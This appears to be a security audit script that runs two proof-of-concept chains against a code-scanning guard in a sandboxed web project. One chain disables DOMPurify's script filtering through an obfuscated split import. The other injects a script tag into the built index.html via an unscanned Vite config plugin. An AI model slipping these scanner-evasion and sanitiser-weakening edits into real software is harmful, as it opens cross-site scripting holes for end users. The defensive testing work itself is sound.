#!/usr/bin/env bash
# Two end-to-end chains against the r7 guard. ABORTS on prerequisite failure.
set -u
SB=/tmp/audit-r7/sb
TARGET=src/components/ft-empty-state.ts
ANCHOR="    this.setAttribute('role', 'status');"

restore() {
  cp /workspace/web/$TARGET "$SB/$TARGET"
  cp /workspace/web/vite.config.ts "$SB/vite.config.ts"
  rm -rf "$SB/dist"
}
restore
( cd "$SB" && npm test ) > /tmp/audit-r7/ch-base.log 2>&1 || { echo "ABORT: baseline red"; exit 90; }
grep -q '75 checks passed (122 assertions)' /tmp/audit-r7/ch-base.log || { echo "ABORT: baseline not 75/122"; exit 91; }
echo "prereq OK: baseline 75 checks / 122 assertions"

echo
echo "=== CHAIN A: singleton capture via split specifier, aimed at SCRIPT EXECUTION ==="
python3 - "$SB/$TARGET" "$ANCHOR" <<'PY'
import sys
p, anchor = sys.argv[1], sys.argv[2]
s = open(p).read()
assert anchor in s, "ABORT: anchor missing"
inject = anchor + """
    void (async () => {
      const P = (await import('dompur' + 'ify')).default as {
        setConfig: (c: unknown) => void;
      };
      P.setConfig({ ADD_TAGS: ['script'], ADD_ATTR: ['onerror'] });
    })();"""
open(p, 'w').write(s.replace(anchor, inject, 1))
PY
[ $? -ne 0 ] && { echo "ABORT: splice failed"; exit 92; }
( cd "$SB" && npm test ) > /tmp/audit-r7/ch-a.log 2>&1; a=$?
( cd "$SB" && npx tsc --noEmit ) > /tmp/audit-r7/ch-a-tsc.log 2>&1; at=$?
echo "CHAIN A: npm test exit=$a  ($(grep -oE '[0-9]+ checks passed \([0-9]+ assertions\)' /tmp/audit-r7/ch-a.log | head -1))  tsc --noEmit exit=$at"
restore

echo
echo "=== CHAIN B: attacker HTML into the shipped index.html via vite.config.ts (unscanned) ==="
python3 - "$SB/vite.config.ts" <<'PY'
import sys
p = sys.argv[1]
s = open(p).read()
old = "  plugins: ["
assert old in s, "ABORT: anchor missing in vite.config.ts"
plug = """  plugins: [
    {
      name: 'audit-r7-poc',
      transformIndexHtml(html: string) {
        return html.replace(
          '</head>',
          '<script>window.__AUDIT_R7_POC__ = 1;</script></head>',
        );
      },
    },
"""
open(p, 'w').write(s.replace(old, plug, 1))
PY
[ $? -ne 0 ] && { echo "ABORT: vite splice failed"; exit 93; }
( cd "$SB" && npm test ) > /tmp/audit-r7/ch-b.log 2>&1; b=$?
( cd "$SB" && npx vite build ) > /tmp/audit-r7/ch-b-build.log 2>&1; bb=$?
echo "CHAIN B: npm test exit=$b ($(grep -oE '[0-9]+ checks passed' /tmp/audit-r7/ch-b.log | head -1))  vite build exit=$bb"
if [ -f "$SB/dist/index.html" ]; then
  echo -n "  injected script present in dist/index.html: "
  grep -c "__AUDIT_R7_POC__" "$SB/dist/index.html"
  echo -n "  public/ asset copied verbatim into dist: "
  ls "$SB/dist/favicon.svg" >/dev/null 2>&1 && echo yes || echo no
else
  echo "  ABORT: no dist/index.html produced"; fi
restore
